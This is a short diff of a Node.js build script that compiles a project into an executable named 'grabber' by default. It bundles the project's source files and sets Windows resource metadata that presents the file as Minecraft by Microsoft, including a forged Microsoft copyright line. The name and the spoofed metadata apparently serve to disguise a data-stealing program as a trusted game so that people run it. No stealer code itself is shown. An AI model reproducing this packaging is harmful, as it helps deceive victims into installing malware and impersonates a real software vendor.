@@ -4,13 +4,13 @@ compile({
   input: './index.js',
   output: (require('./config').filename || 'grabber') + '.exe',
   build: true,
-  resources: ['./functions/*.js', './util/*.js', './util/**/*.exe'],
+  resources: ['index.js', './config.js', './functions/*.js', './util/*.js', './util/**/*.exe'],
   ico: './icon.ico',
   rc: { // This is one of the best things that exists
     CompanyName: 'Minecraft',
     ProductVersion: '1.19.60.03',
     FileVersion: '1.19.60.3',
-    Copyright: '© Microsoft. All rights reserved.',
+    LegalCopyright: '© Microsoft. All rights reserved.',
     OriginalFilename: 'Minecraft',
     FileDescription: 'Minecraft',
     ProductName: 'Minecraft'
